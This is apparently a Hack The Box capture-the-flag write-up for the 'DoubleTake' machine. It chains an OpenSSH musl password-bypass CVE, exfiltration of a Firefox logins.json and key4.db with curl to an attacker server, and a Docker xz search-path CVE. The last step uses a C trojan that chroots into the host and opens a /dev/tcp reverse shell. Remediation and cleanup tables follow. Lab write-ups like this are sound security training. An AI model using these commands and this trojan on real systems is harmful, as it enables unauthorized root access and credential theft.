<img src="Images/DoubleTake%20-%20logo.png" width="240">

# Attack Chain

```
└─► nmap → :22 SSH (OpenSSH 10.6) + :80 nginx (Basic Auth, realm Zentara)
	 └─► CVE-2026-123158 (SSHole) → OpenSSH on musl w/o PAM, password auth bypass
		  └─► overlong password (300×A) on a locked account → Shell as alpine (container)
			   └─► loot ~/.mozilla of alpine → logins.json + key4.db
				    └─► firefox-decrypt → base64 creds → bob:<REDACTED>
					     └─► SSH bob:<REDACTED> → Shell as bob → user.txt
						      └─► web login as bob → Status page → vulnerable Docker version
							       └─► CVE-2026-41567 (Moby) → daemon resolves xz from container FS
								        └─► plant malicious static xz via /deploy API (uncompressed tar)
									         └─► trigger .tar.xz → daemon runs our xz as root on host
										          └─► mount proc + chroot /proc/1/root → reverse shell as root → root.txt
```

# Table of Contents

- [Recon](#recon)
    - [Nmap](#nmap)
- [Web](#web)
- [CVE-2026-123158 (SSHole)](#cve-2026-123158-sshole)
- [Firefox credentials](#firefox-credentials)
    - [Home user discovery](#home-user-discovery)
    - [Decrypt credentials](#decrypt-credentials)
    - [Shell as bob (user flag)](#shell-as-bob-user-flag)
- [Privilege Escalation](#privilege-escalation)
    - [CVE-2026-41567 (Moby / Docker)](#cve-2026-41567-moby--docker)
    - [Crafting the malicious xz](#crafting-the-malicious-xz)
    - [Plant the binary](#plant-the-binary)
    - [Trigger the exploit](#trigger-the-exploit)
- [Remediation](#remediation)
- [Cleanup](#cleanup)

---

# Recon

## Nmap

### Port scan

```
nmap -sVC 10.129.*.* -oA scans/doubletake

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 10.6 (protocol 2.0)
80/tcp open  http    nginx 1.24.0 (Ubuntu)
|_http-server-header: nginx/1.24.0 (Ubuntu)
|_http-title: Site doesn't have a title (text/html; charset=utf-8).
| http-auth:
| HTTP/1.1 401 UNAUTHORIZED\x0D
|_  Basic realm=Zentara
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Two services were exposed: an OpenSSH 10.6 server and an nginx instance protecting the **Zentara** application behind HTTP Basic authentication (realm `Zentara`).

### Vuln scan

```
nmap -p22 -sVC 10.129.*.* --script vuln

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 10.6 (protocol 2.0)
| vulners:
|   cpe:/a:openbsd:openssh:10.6:
|       KS:SCANNER-SSH-OPENSSH_CVE_2026_123158_DETECT   8.1   *EXPLOIT*
|       KS:EXPLOITS-LINUX-SSH-OPENSSH_CVE_2026_123158_SSHHOLE   8.1   *EXPLOIT*
```

The `vulners` script flagged the OpenSSH version as vulnerable to [CVE-2026-123158](https://ubuntu.com/security/CVE-2026-123158), nicknamed **SSHole**.

## Web

Browsing to `http://10.129.*.*/` triggered an HTTP Basic auth prompt (realm `Zentara`), then an application login form.

![DoubleTake - Login form](Images/DoubleTake%20-%20Login%20form.png)

We had no credentials, and common weak combinations didn't work, so we parked the web app and focused on SSH.

# CVE-2026-123158 (SSHole)

**CVE-2026-123158** ("SSHole", CVSS 8.1) is a password authentication bypass in the OpenSSH daemon (`sshd`) prior to 10.6p2, when it is built with the musl C library and without PAM. In that configuration, `sshd` verifies passwords itself through `crypt()`. A password of a specific length makes musl's `crypt()` return an error value that `sshd` misinterprets as a match, allowing login. The flaw targets accounts whose password is disabled/locked (field `*` or `!` in `/etc/shadow`): service accounts or key-only accounts. Alpine Linux uses musl without PAM by default, which makes it the most exposed target (also OpenWrt, Buildroot, Yocto). Fixed in OpenSSH 10.6p2; added to the CISA KEV catalog on November 9, 2026.

To exploit the flaw, we only needed to supply a password that was long enough — here any value between **257 and 1024 bytes**. We therefore crafted a password made of the letter `A` repeated 300 times:

```
printf 'A%.0s' {1..300}
```

On Alpine, several accounts have a `*` in `/etc/shadow` by default (disabled password) — for example `root`, `alpine`, `postgres`, etc. These locked accounts could be logged into. We listed the candidates with:

```
awk -F: '$2 == "*" || $2 == "!" {print $1}' /etc/shadow
```

The `alpine` account was accepted by the target over SSH. Quirk observed on this box: the password had to be entered **twice** (the first attempt returned `Permission denied`, the second succeeded).

```
ssh alpine@10.129.*.*
alpine@10.129.*.*'s password:
Permission denied, please try again.
alpine@10.129.*.*'s password:
Welcome to Alpine!

7f906e0ee8ec:~$
```

The hostname `7f906e0ee8ec` (short container ID) confirmed we were **inside a Docker container**, not on the host.

# Firefox credentials

## Home user discovery

We first noticed that a second user was present on the container:

```
7f906e0ee8ec:~$ ls /home
alpine  bob
```

In the `alpine` profile, the `.mozilla` directory held a Firefox profile with saved credentials:

```
7f906e0ee8ec:~/.mozilla/firefox/zentara.default$ cat logins.json
{"nextId":2,"logins":[{"id":1,"hostname":"http://172.17.0.1","httpRealm":"Zentara","formActionOrigin":null,"usernameField":"","passwordField":"","encryptedUsername":"Ym9i","encryptedPassword":"<REDACTED>","guid":"{a1b2c3d4-e5f6-7890-abcd-ef1234567890}","encType":0,"timeCreated":1730000000000,"timeLastUsed":1730900000000,"timePasswordChanged":1730000000000,"timesUsed":14}],"potentiallyVulnerablePasswords":[],"dismissedBreachAlertsByLoginGUID":{},"version":3}
```

> [!TIP]
> **Important details**
>
> - `hostname` was `http://172.17.0.1`: this is the Docker bridge gateway, so the Zentara application ran on the Docker host, reachable from the container. This foreshadowed the privilege escalation.
> - `encType: 0` means no encryption was applied (no Primary Password): the `encrypted*` fields were really just base64.

To confirm, we transferred the two required files (`logins.json` and `key4.db`) to our machine (HTTP server listening on the attacker side):

```
python3 -m uploadserver 80
```

```
7f906e0ee8ec:~/.mozilla/firefox/zentara.default$ curl -X POST http://10.10.*.*/upload -F 'files=@logins.json'
7f906e0ee8ec:~/.mozilla/firefox/zentara.default$ curl -X POST http://10.10.*.*/upload -F 'files=@key4.db'
```

## Decrypt credentials

We ran `firefox-decrypt` on the profile:

```
firefox-decrypt .
2026-11-16 14:49:59,331 - WARNING - profile.ini not found in .
2026-11-16 14:49:59,331 - WARNING - Continuing and assuming '.' is a profile location

Website:   http://172.17.0.1
Username: 'Ym9i'
Password: '<REDACTED>'
```

As expected, nothing was encrypted: the values were simply base64-encoded. We decoded them:

```
echo 'Ym9i' | base64 -d
bob

echo '<REDACTED>' | base64 -d
<REDACTED>
```

Recovered credentials: **`bob` / `<REDACTED>`**.

## Shell as bob (user flag)

The `bob` account had a real password (the SSHole bypass only applies to locked accounts), but we now held its credentials. SSH login as `bob` succeeded and yielded the user flag:

```
ssh bob@10.129.*.*
bob@10.129.*.*'s password:

7f906e0ee8ec:~$ ls
user.txt
```

# Privilege Escalation

The same credentials (`bob` / `<REDACTED>`) let us authenticate on the Zentara web form.

![DoubleTake - login success](Images/DoubleTake%20-login%20success.png)

Clicking **Status**, the application revealed the Docker version in use:

![DoubleTake - Docker version](Images/DoubleTake%20-%20Docker%20version.png)

The exposed version was vulnerable to **CVE-2026-41567**.

## CVE-2026-41567 (Moby / Docker)

**CVE-2026-41567** (CVSS 7.2, CWE-427 "Uncontrolled Search Path Element") affects Moby / Docker Engine (moby/v2/daemon < 2.0.0-beta.14, Docker Engine < 29.5.1). When a compressed archive is uploaded into a container via `PUT /containers/{id}/archive` (the mechanism behind `docker cp`), the daemon resolves decompression binaries (such as `xz` or `unpigz`) from the container's filesystem instead of the host's, due to an incorrect ordering of operations. A container carrying a trojanized `xz` then achieves code execution as root on the host.

The key point for exploitation: the trojanized binary is executed by the daemon, a host root process. It inherits its capabilities (including `CAP_SYS_ADMIN`) and runs in the host PID namespace. Its filesystem view, however, remains that of the container — hence the pivot: mounting a `procfs` then `chroot`-ing into `/proc/1/root` (the root of the host's init) grants access to the host filesystem.

## Crafting the malicious xz

We wrote a fake `xz` that performed the pivot and opened a reverse shell:

```c
// xz.c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/mount.h>

int main(int argc, char *argv[]) {
    mount("proc", "/proc", "proc", 0, NULL);   // procfs exposing the host PID namespace
    chroot("/proc/1/root");                     // root of the host init's filesystem
    chdir("/");
    execl("/bin/bash", "bash", "-c",
          "bash -i >& /dev/tcp/10.10.*.*/4444 0>&1", NULL);
    return 1;
}
```

We compiled it **statically** (mandatory: the binary had to run without dependencies in the container context):

```
gcc xz.c -static -o xz
```

## Plant the binary

We rebuilt the `usr/bin/` tree around our `xz` and packed it into an **uncompressed** archive (plant phase: no decompression was triggered, the file was simply written into the container):

```
mkdir -p pkg/usr/bin
cp xz pkg/usr/bin/xz
cd pkg && tar cf ../plant.tar usr/bin/xz
```

Uploading through the web UI was blocked:

![DoubleTake - upload attempt](Images/DoubleTake%20-%20upload%20attempt.png)

But the API documentation gave the correct syntax, and the `/deploy` endpoint only enforced Basic auth (no token or API key required):

![DoubleTake - API](Images/DoubleTake%20-%20API.png)

We dropped the archive. The server pinned extraction under `/workspace` (the returned `workspace` was `/workspace` regardless of what we sent):

```
curl -u bob:<REDACTED> http://10.129.*.*/deploy \
  -F archive="@plant.tar" \
  -F workspace="/"

{"deployment":{"created_at":1794842947,"filename":"plant.tar","id":"dep-b0a142","size":768000,"status":"success","workspace":"/workspace"},"status":"success"}
```

## Trigger the exploit

We created a small **xz-compressed** archive: on receipt, the daemon detected the xz signature in the stream, resolved `xz` from the container filesystem (our planted binary) and executed it as root on the host.

```
echo a > hacked && tar cf - hacked | xz > hacked.tar.xz
```

We started the listener :

```
penelope -p 4444
```

Then we sent the trigger to the same workspace:

```
curl -u bob:<REDACTED> \
  -F 'archive=@hacked.tar.xz' \
  -F 'workspace=/workspace' \
  http://10.129.*.*/deploy
```

The reverse shell landed as **root on the host**:

```
root@doubletake:/# id
uid=0(root) gid=0(root) groups=0(root)
```

The `chroot("/proc/1/root")` pivot placed us on the host filesystem: `root.txt` was directly accessible.

> [!IMPORTANT]
> Machine rooted

---

# Remediation

| #   | Vulnerability / weakness                                                     | Location                                                                   | Remediation                                                                                                                                     |
| --- | ---------------------------------------------------------------------------- | -------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------ |
| 1   | **CVE-2026-123158 (SSHole)** - password auth bypass                          | sshd (OpenSSH < 10.6p2, musl without PAM)                                  | Upgrade to **OpenSSH ≥ 10.6p2**; enable **PAM**; disable password auth (`PasswordAuthentication no`, keys only); properly lock service accounts |
| 2   | **Password reuse**                                                           | `bob`: same secret for the web app, the `/deploy` API and SSH              | Unique secret per service; forbid credential reuse                                                                                              |
| 3   | **Weak credential storage**                                                  | Firefox profile of `alpine` (`logins.json` in base64, no Primary Password) | Don't store credentials in a browser profile on a server; set a Primary Password; purge `.mozilla` from service accounts                        |
| 4   | **`/deploy` API over HTTP Basic auth** + path validation on the UI only      | Zentara application (front blocks `/`, API doesn't)                        | Enforce **HTTPS**; strong auth / tokens; **validate `workspace` server-side**; rate limiting                                                    |
| 5   | **CVE-2026-41567 (Moby)** — decompression binary resolved from the container | Docker Engine < 29.5.1 / moby v2 < 2.0.0-beta.14                           | Upgrade **Docker Engine ≥ 29.5.1**; don't expose the `containers/{id}/archive` API to untrusted users                                            |
| 6   | **Over-privileged deploy backend**                                           | The web app writes / `docker cp`s into containers as root                  | Least-privilege deploy broker; **rootless Docker**; drop `CAP_SYS_ADMIN`; seccomp/AppArmor; isolate the daemon                                   |

# Cleanup

| Introduced artifact                            | Location                                                                | Action                                                                     |
| ---------------------------------------------- | ------------------------------------------------------------------------ | --------------------------------------------------------------------------- |
| Uploaded archives `plant.tar`, `hacked.tar.xz` | Workspace `/workspace` (container) + deployment records (`dep-b0a142`…) | Delete the files; purge the deployment entries                             |
| Trojanized `xz` binary                         | `/workspace/usr/bin/xz` (container)                                     | Remove and restore the legitimate `xz`                                     |
| Root reverse shell process                     | Host (`bash` → `10.10.*.*:4444`)                                        | `kill` the process; check for persistence (cron, services, added SSH keys) |
| Debug proof files (if used)                    | `/proof_ran`, `/proof_host`                                             | Remove                                                                      |
| procfs remounted by the trojan                 | `/proc` inside the container                                            | Ephemeral (cleared on container restart); note it                          |
| Exfiltrated files                              | Attacker side: `logins.json`, `key4.db`                                | Destroy after the engagement (sensitive data)                              |
| Accounts / sessions used                       | SSH logins `alpine` / `bob`, web session `bob`                         | **Document** (timestamps, IPs) in the report — don't erase logs            |

<div align="center">
  <a href="https://labs.hackthebox.com/achievement/machine/2127339/1018">
    <img src="Images/DoubleTake%20-%20pwned.png" width="600" alt="DoubleTake has been Pwned">
  </a>
</div>
